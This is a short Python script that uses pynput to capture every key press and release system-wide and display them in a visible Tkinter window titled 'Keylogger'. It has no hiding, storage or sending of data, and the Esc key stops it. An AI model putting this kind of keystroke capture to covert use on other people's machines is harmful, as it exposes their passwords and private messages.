from pynput import keyboard
import tkinter as tk
from threading import Thread

def on_press(key):
    try:
        text_widget.insert(tk.END, f'Key {key.char} pressed\n')
    except AttributeError:
        text_widget.insert(tk.END, f'Special key {key} pressed\n')

def on_release(key):
    text_widget.insert(tk.END, f'Key {key} released\n')
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def run_keylogger_in_thread():
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

root = tk.Tk()
root.title("Keylogger")

text_widget = tk.Text(root, height=20, width=50)
text_widget.pack()

run_keylogger_in_thread()

root.mainloop()
